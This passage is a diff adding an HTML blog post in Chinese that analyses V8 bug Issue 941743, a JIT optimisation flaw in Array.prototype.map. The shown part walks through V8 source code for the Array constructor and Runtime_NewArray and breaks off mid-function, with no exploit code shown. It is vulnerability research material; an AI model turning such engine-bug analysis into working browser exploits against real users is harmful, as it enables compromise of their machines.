@@ -1,0 +1,545 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 7.3.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/ha1vk/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/ha1vk/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/ha1vk/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/ha1vk/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/ha1vk/css/main.css">
+
+
+<link rel="stylesheet" href="/ha1vk/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"github.com","root":"/ha1vk/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.json"};
+  </script>
+
+  <meta name="description" content="文章首发于安全KER https:&#x2F;&#x2F;www.anquanke.com&#x2F;post&#x2F;id&#x2F;234429 0x00 前言Issue 941743是2019年的一个v8方面的历史漏洞，其漏洞发生在对Array.prototype.map函数的Reduce过程，之前介绍过Array.prototype.map的一个回调漏洞，本文将介绍其在JIT层的一个优化漏洞。 0x01 前置知识Array.protot">
+<meta property="og:type" content="article">
+<meta property="og:title" content="issue_941743">
+<meta property="og:url" content="https://github.com/ha1vk/2021/03/19/issue-941743/index.html">
+<meta property="og:site_name" content="ha1vk&#39;s blog">
+<meta property="og:description" content="文章首发于安全KER https:&#x2F;&#x2F;www.anquanke.com&#x2F;post&#x2F;id&#x2F;234429 0x00 前言Issue 941743是2019年的一个v8方面的历史漏洞，其漏洞发生在对Array.prototype.map函数的Reduce过程，之前介绍过Array.prototype.map的一个回调漏洞，本文将介绍其在JIT层的一个优化漏洞。 0x01 前置知识Array.protot">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://github.com/ha1vk/2021/03/19/issue-941743/1.png">
+<meta property="og:image" content="https://github.com/ha1vk/2021/03/19/issue-941743/2.png">
+<meta property="og:image" content="https://github.com/ha1vk/2021/03/19/issue-941743/3.jpg">
+<meta property="og:image" content="https://github.com/ha1vk/2021/03/19/issue-941743/4.jpg">
+<meta property="article:published_time" content="2021-03-19T02:30:20.000Z">
+<meta property="article:modified_time" content="2025-06-26T09:40:28.952Z">
+<meta property="article:author" content="ha1vk">
+<meta property="article:tag" content="JS引擎漏洞">
+<meta property="article:tag" content="类型混淆">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://github.com/ha1vk/2021/03/19/issue-941743/1.png">
+
+<link rel="canonical" href="https://github.com/ha1vk/2021/03/19/issue-941743/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>issue_941743 | ha1vk's blog</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/ha1vk/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">ha1vk's blog</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/ha1vk/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/ha1vk/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/ha1vk/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/ha1vk/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/ha1vk/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://github.com/ha1vk/2021/03/19/issue-941743/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/ha1vk/images/avatar.gif">
+      <meta itemprop="name" content="ha1vk">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="ha1vk's blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          issue_941743
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2021-03-19 10:30:20" itemprop="dateCreated datePublished" datetime="2021-03-19T10:30:20+08:00">2021-03-19</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2025-06-26 17:40:28" itemprop="dateModified" datetime="2025-06-26T17:40:28+08:00">2025-06-26</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/ha1vk/categories/CTF/" itemprop="url" rel="index"><span itemprop="name">CTF</span></a>
+                </span>
+                  ，
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/ha1vk/categories/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/" itemprop="url" rel="index"><span itemprop="name">安全研究</span></a>
+                </span>
+            </span>
+
+          
+            <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p>文章首发于安全KER <a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/234429">https://www.anquanke.com/post/id/234429</a></p>
+<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>Issue 941743是2019年的一个v8方面的历史漏洞，其漏洞发生在对Array.prototype.map函数的Reduce过程，之前介绍过Array.prototype.map的一个回调漏洞，本文将介绍其在JIT层的一个优化漏洞。</p>
+<h1 id="0x01-前置知识"><a href="#0x01-前置知识" class="headerlink" title="0x01 前置知识"></a>0x01 前置知识</h1><h2 id="Array-prototype-map"><a href="#Array-prototype-map" class="headerlink" title="Array.prototype.map()"></a>Array.prototype.map()</h2><p>Array.prototype.map()函数用于从一个数组中根据函数关系创建一个映射，其语法如下</p>
+<p>var new_array &#x3D; arr.map(function callback(currentValue[, index[, array]]) {<br>&#x2F;&#x2F; Return element for new_array<br>}[, thisArg])</p>
+<p>基本用法如下</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> a = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> b = a.<span class="title function_">map</span>(<span class="function">(<span class="params">value,index</span>)=&gt;</span>&#123;</span><br><span class="line">   <span class="title function_">print</span>(<span class="string">&quot;index=&quot;</span>+index+<span class="string">&quot; value=&quot;</span> + value);</span><br><span class="line">   <span class="keyword">return</span> value+<span class="number">1</span>;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="title function_">print</span>(<span class="string">&quot;b=&quot;</span>,b);</span><br></pre></td></tr></table></figure>
+<p>输出如下</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">index=<span class="number">0</span> value=<span class="number">1</span></span><br><span class="line">index=<span class="number">1</span> value=<span class="number">2</span></span><br><span class="line">index=<span class="number">2</span> value=<span class="number">3</span></span><br><span class="line">b= <span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span></span><br></pre></td></tr></table></figure>
+<h2 id="Array-函数调用链及JIT优化分析"><a href="#Array-函数调用链及JIT优化分析" class="headerlink" title="Array()函数调用链及JIT优化分析"></a>Array()函数调用链及JIT优化分析</h2><h3 id="源码分析"><a href="#源码分析" class="headerlink" title="源码分析"></a>源码分析</h3><p>当我们执行var a &#x3D; Array(1)时，首先调用的是ArrayConstructor，该函数位于src&#x2F;builtins&#x2F;builtins-array-gen.cc，按照源码分析，其调用链为ArrayConstructor -&gt; ArrayConstructorImpl -&gt; GenerateArrayNArgumentsConstructor -&gt; TailCallRuntime<br>GenerateArrayNArgumentsConstructor函数如下，其结尾使用了TailCallRuntime去调用某个函数</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">ArrayBuiltinsAssembler::GenerateArrayNArgumentsConstructor</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    TNode&lt;Context&gt; context, TNode&lt;JSFunction&gt; target, TNode&lt;Object&gt; new_target,</span></span></span><br><span class="line"><span class="params"><span class="function">    TNode&lt;Int32T&gt; argc, TNode&lt;HeapObject&gt; maybe_allocation_site)</span> </span>&#123;</span><br><span class="line">  <span class="comment">// Replace incoming JS receiver argument with the target.</span></span><br><span class="line">  <span class="comment">// TODO(ishell): Avoid replacing the target on the stack and just add it</span></span><br><span class="line">  <span class="comment">// as another additional parameter for Runtime::kNewArray.</span></span><br><span class="line">  <span class="function">CodeStubArguments <span class="title">args</span><span class="params">(<span class="keyword">this</span>, ChangeInt32ToIntPtr(argc))</span></span>;</span><br><span class="line">  args.<span class="built_in">SetReceiver</span>(target);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Adjust arguments count for the runtime call: +1 for implicit receiver</span></span><br><span class="line">  <span class="comment">// and +2 for new_target and maybe_allocation_site.</span></span><br><span class="line">  argc = <span class="built_in">Int32Add</span>(argc, <span class="built_in">Int32Constant</span>(<span class="number">3</span>));</span><br><span class="line">  <span class="built_in">TailCallRuntime</span>(Runtime::kNewArray, argc, context, new_target,</span><br><span class="line">                  maybe_allocation_site);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>而TailCallRuntime函数在不同指令架构上有不同的实现，这里我们看x64架构的实现</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">MacroAssembler::TailCallRuntime</span><span class="params">(Runtime::FunctionId fid)</span> </span>&#123;</span><br><span class="line">  <span class="comment">// ----------- S t a t e -------------</span></span><br><span class="line">  <span class="comment">//  -- rsp[0]                 : return address</span></span><br><span class="line">  <span class="comment">//  -- rsp[8]                 : argument num_arguments - 1</span></span><br><span class="line">  <span class="comment">//  ...</span></span><br><span class="line">  <span class="comment">//  -- rsp[8 * num_arguments] : argument 0 (receiver)</span></span><br><span class="line">  <span class="comment">//</span></span><br><span class="line">  <span class="comment">//  For runtime functions with variable arguments:</span></span><br><span class="line">  <span class="comment">//  -- rax                    : number of  arguments</span></span><br><span class="line">  <span class="comment">// -----------------------------------</span></span><br><span class="line"></span><br><span class="line">  <span class="type">const</span> Runtime::Function* function = Runtime::<span class="built_in">FunctionForId</span>(fid);</span><br><span class="line">  <span class="built_in">DCHECK_EQ</span>(<span class="number">1</span>, function-&gt;result_size);</span><br><span class="line">  <span class="keyword">if</span> (function-&gt;nargs &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="built_in">Set</span>(rax, function-&gt;nargs);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">JumpToExternalReference</span>(ExternalReference::<span class="built_in">Create</span>(fid));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>通过Runtime::FunctionForId(fid)找到函数对象，在源码文件中src&#x2F;runtime&#x2F;runtime.cc中有定义</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">const</span> Runtime::Function* <span class="title">Runtime::FunctionForId</span><span class="params">(Runtime::FunctionId id)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> &amp;(kIntrinsicFunctions[<span class="built_in">static_cast</span>&lt;<span class="type">int</span>&gt;(id)]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>其中kIntrinsicFunctions的定义如下</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">const</span> Runtime::Function kIntrinsicFunctions[] = &#123;</span><br><span class="line">    <span class="built_in">FOR_EACH_INTRINSIC</span>(F) <span class="built_in">FOR_EACH_INLINE_INTRINSIC</span>(I)&#125;;</span><br></pre></td></tr></table></figure>
+<p>宏定义FOR_EACH_INTRINSIC如下</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> FOR_EACH_INTRINSIC_IMPL(F, I)       \</span></span><br><span class="line"><span class="meta">  FOR_EACH_INTRINSIC_RETURN_PAIR_IMPL(F, I) \</span></span><br><span class="line"><span class="meta">  FOR_EACH_INTRINSIC_RETURN_OBJECT_IMPL(F, I)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> FOR_EACH_INTRINSIC_RETURN_OBJECT_IMPL(F, I) \</span></span><br><span class="line"><span class="meta">  FOR_EACH_INTRINSIC_ARRAY(F, I)                    \</span></span><br><span class="line"><span class="meta">  FOR_EACH_INTRINSIC_ATOMICS(F, I)                  \</span></span><br><span class="line"><span class="meta">  FOR_EACH_INTRINSIC_BIGINT(F, I)                   \</span></span><br><span class="line"><span class="meta">  FOR_EACH_INTRINSIC_CLASSES(F, I)                  \</span></span><br><span class="line"><span class="meta">  FOR_EACH_INTRINSIC_COLLECTIONS(F, I)              \</span></span><br><span class="line"><span class="meta">  FOR_EACH_INTRINSIC_COMPILER(F, I)                 \</span></span><br><span class="line"><span class="meta">  FOR_EACH_INTRINSIC_DATE(F, I)                     \</span></span><br><span class="line"><span class="meta">  FOR_EACH_INTRINSIC_DEBUG(F, I)                    \</span></span><br><span class="line"><span class="meta">  FOR_EACH_INTRINSIC_FORIN(F, I)                    \</span></span><br><span class="line"><span class="meta">  FOR_EACH_INTRINSIC_FUNCTION(F, I)                 \</span></span><br><span class="line"><span class="meta">  FOR_EACH_INTRINSIC_GENERATOR(F, I)                \</span></span><br><span class="line"><span class="meta">  FOR_EACH_INTRINSIC_IC(F, I)                       \</span></span><br><span class="line"><span class="meta">  FOR_EACH_INTRINSIC_INTERNAL(F, I)                 \</span></span><br><span class="line"><span class="meta">  FOR_EACH_INTRINSIC_INTERPRETER(F, I)              \</span></span><br><span class="line"><span class="meta">  FOR_EACH_INTRINSIC_INTL(F, I)                     \</span></span><br><span class="line"><span class="meta">  FOR_EACH_INTRINSIC_LITERALS(F, I)                 \</span></span><br><span class="line"><span class="meta">  FOR_EACH_INTRINSIC_MODULE(F, I)                   \</span></span><br><span class="line"><span class="meta">  FOR_EACH_INTRINSIC_NUMBERS(F, I)                  \</span></span><br><span class="line"><span class="meta">  FOR_EACH_INTRINSIC_OBJECT(F, I)                   \</span></span><br><span class="line"><span class="meta">  FOR_EACH_INTRINSIC_OPERATORS(F, I)                \</span></span><br><span class="line"><span class="meta">  FOR_EACH_INTRINSIC_PROMISE(F, I)                  \</span></span><br><span class="line"><span class="meta">  FOR_EACH_INTRINSIC_PROXY(F, I)                    \</span></span><br><span class="line"><span class="meta">  FOR_EACH_INTRINSIC_REGEXP(F, I)                   \</span></span><br><span class="line"><span class="meta">  FOR_EACH_INTRINSIC_SCOPES(F, I)                   \</span></span><br><span class="line"><span class="meta">  FOR_EACH_INTRINSIC_STRINGS(F, I)                  \</span></span><br><span class="line"><span class="meta">  FOR_EACH_INTRINSIC_SYMBOL(F, I)                   \</span></span><br><span class="line"><span class="meta">  FOR_EACH_INTRINSIC_TEST(F, I)                     \</span></span><br><span class="line"><span class="meta">  FOR_EACH_INTRINSIC_TYPEDARRAY(F, I)               \</span></span><br><span class="line"><span class="meta">  FOR_EACH_INTRINSIC_WASM(F, I)                     \</span></span><br><span class="line"><span class="meta">  FOR_EACH_INTRINSIC_WEAKREF(F, I)</span></span><br></pre></td></tr></table></figure>
+<p>其中，我们较为关注的kNewArray函数在FOR_EACH_INTRINSIC_ARRAY里被注册</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">#define FOR_EACH_INTRINSIC_ARRAY(F, I) \</span><br><span class="line">  F(ArrayIncludes_Slow, 3, 1)          \</span><br><span class="line">  F(ArrayIndexOf, 3, 1)                \</span><br><span class="line">  F(ArrayIsArray, 1, 1)                \</span><br><span class="line">  F(ArraySpeciesConstructor, 1, 1)     \</span><br><span class="line">  F(GrowArrayElements, 2, 1)           \</span><br><span class="line">  I(IsArray, 1, 1)                     \</span><br><span class="line">  F(NewArray, -1 /* &gt;= 3 */, 1)        \</span><br><span class="line">  F(NormalizeElements, 1, 1)           \</span><br><span class="line">  F(TransitionElementsKind, 2, 1)      \</span><br><span class="line">  F(TransitionElementsKindWithKind, 2, 1)</span><br></pre></td></tr></table></figure>
+<p>由此可以知道Array(1)最终调用的是NewArray函数，该函数位于src&#x2F;runtime&#x2F;runtime-array.cc文件</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">RUNTIME_FUNCTION</span>(Runtime_NewArray) &#123;</span><br><span class="line">  <span class="function">HandleScope <span class="title">scope</span><span class="params">(isolate)</span></span>;</span><br><span class="line">  <span class="built_in">DCHECK_LE</span>(<span class="number">3</span>, args.<span class="built_in">length</span>());</span><br><span class="line">  <span class="type">int</span> <span class="type">const</span> argc = args.<span class="built_in">length</span>() - <span class="number">3</span>;</span><br><span class="line">  <span class="comment">// argv points to the arguments constructed by the JavaScript call.</span></span><br><span class="line">  <span class="function">JavaScriptArguments <span class="title">argv</span><span class="params">(argc, args.address_of_arg_at(<span class="number">0</span>))</span></span>;</span><br><span class="line">  <span class="built_in">CONVERT_ARG_HANDLE_CHECKED</span>(JSFunction, constructor, argc);</span><br><span class="line">  <span class="built_in">CONVERT_ARG_HANDLE_CHECKED</span>(JSReceiver, new_target, argc + <span class="number">1</span>);</span><br><span class="line">  <span class="built_in">CONVERT_ARG_HANDLE_CHECKED</span>(HeapObject, type_info, argc + <span class="number">2</span>);</span><br><span class="line">  <span class="comment">// TODO(bmeurer): Use MaybeHandle to pass around the AllocationSite.</span></span><br><span class="line">  Handle&lt;AllocationSite&gt; site = type_info-&gt;<span class="built_in">IsAllocationSite</span>()</span><br><span class="line">                                    ? Handle&lt;AllocationSite&gt;::<span class="built_in">cast</span>(type_info)</span><br><span class="line">                                    : Handle&lt;AllocationSite&gt;::<span class="built_in">null</span>();</span><br><span class="line"></span><br><span class="line">  Factory* factory = isolate-&gt;<span class="built_in">factory</span>();</span><br><span class="line"></span><br><span class="line">  <span class="comment">// If called through new, new.target can be:</span></span><br><span class="line">  <span class="comment">// - a subclass of constructor,</span></span><br><span class="line">  <span class="comment">// - a proxy wrapper around constructor, or</span></span><br><span class="line">  <span class="comment">// - the constructor itself.</span></span><br><span class="line">  <span class="comment">// If called through Reflect.construct, it&#x27;s guaranteed to be a constructor by</span></span><br><span class="line">  <span class="comment">// REFLECT_CONSTRUCT_PREPARE.</span></span><br><span class="line">  <span class="built_in">DCHECK</span>(new_target-&gt;<span class="built_in">IsConstructor</span>());</span><br><span class="line"></span><br><span class="line">  <span class="type">bool</span> holey = <span class="literal">false</span>;</span><br><span class="line">  <span class="type">bool</span> can_use_type_feedback = !site.<span class="built_in">is_null</span>();</span><br><span class="line">  <span class="type">bool</span> can_inline_array_constructor = <span class="literal">true</span>;</span><br><span class="line">  <span class="keyword">if</span> (argv.<span class="built_in">length</span>() == <span class="number">1</span>) &#123;</span><br><span class="line">    Handle&lt;Object&gt; argument_one = argv.<span class="built_in">at</span>&lt;Object&gt;(<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (argument_one-&gt;<span class="built_in">IsSmi</span>()) &#123;</span><br><span class="line">      <span class="type">int</span> value = Handle&lt;Smi&gt;::<span class="built_in">cast</span>(argument_one)-&gt;<span class="built_in">value</span>();</span><br><span class="line">      <span class="keyword">if</span> (value &lt; <span class="number">0</span> ||</span><br><span class="line">          JSArray::<span class="built_in">SetLengthWouldNormalize</span>(isolate-&gt;<span class="built_in">heap</span>(), value)) &#123;</span><br><span class="line">        <span class="comment">// the array is a dictionary in this case.</span></span><br><span class="line">        can_use_type_feedback = <span class="literal">false</span>;</span><br><span class="line">      &#125; <span class="keyword">else</span> <span class="keyword">if</span> (value != <span class="number">0</span>) &#123;</span><br><span class="line">        holey = <span class="literal">true</span>;</span><br><span class="line">        <span class="keyword">if</span> (value &gt;= JSArray::kInitialMaxFastElementArray) &#123;</span><br><span class="line">          can_inline_array_constructor = <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="comment">// Non-smi length argument produces a dictionary</span></span><br><span class="line">      can_use_type_feedback = <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  ...............................省略线......................</span><br><span class="line"><span class="keyword">if</span> (!site.<span class="built_in">is_null</span>()) &#123;</span><br><span class="line">    <span class="keyword">if</span> ((old_kind != array-&gt;<span class="built_in">GetElementsKind</span>() || !can_use_type_feedback ||</span><br><span class="line">         !can_inline_array_constructor)) &#123;</span><br><span class="line">      <span class="comment">// The arguments passed in caused a transition. This kind of complexity</span></span><br><span class="line">      <span class="comment">// can&#x27;t be dealt with in the inlined optimized array constructor case.</span></span><br><span class="line">      <span class="comment">// We must mark the allocationsite as un-inlinable.</span></span><br><span class="line">      site-&gt;<span class="built_in">SetDoNotInlineCall</span>();</span><br><span class="line">    &#125;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (old_kind != array-&gt;<span class="built_in">GetElementsKind</span>() || !can_inline_array_constructor) &#123;</span><br><span class="line">      <span class="comment">// We don&#x27;t have an AllocationSite for this Array constructor invocation,</span></span><br><span class="line">      <span class="comment">// i.e. it might a call from Array#map or from an Array subclass, so we</span></span><br><span class="line">      <span class="comment">// just flip the bit on the global protector cell instead.</span></span><br><span class="line">      <span class="comment">// TODO(bmeurer): Find a better way to mark this. Global protectors</span></span><br><span class="line">      <span class="comment">// tend to back-fire over time...</span></span><br><span class="line">      <span class="keyword">if</span> (Protectors::<span class="built_in">IsArrayConstructorIntact</span>(isolate)) &#123;</span><br><span class="line">        Protectors::<span 